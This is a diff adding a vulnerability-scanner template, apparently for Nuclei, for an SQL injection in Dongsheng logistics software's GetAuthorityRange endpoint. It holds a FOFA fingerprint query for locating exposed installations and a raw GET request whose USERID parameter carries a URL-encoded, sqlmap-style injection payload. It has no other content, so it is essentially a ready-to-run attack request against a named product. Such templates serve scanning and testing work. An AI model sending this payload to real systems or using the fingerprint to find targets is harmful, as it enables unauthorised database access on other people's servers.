@@ -1,0 +1,23 @@
+id: poc-ap095s0imvl2yx7r
+info:
+  name: 东胜物流软件 GetAuthorityRange 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ap095s0imvl2yx7r'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ap095s0imvl2yx7r
+    fofa: body="FeeCodes/CompanysAdapter.aspx"||body="dhtmlxcombo_whp.js"||body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+http:
+- raw:
+  - 'GET /CommMng/BasicDataRef/GetAuthorityRange?modName=-1&USERID=1%27%29%20AND%202619%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20aKIF HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
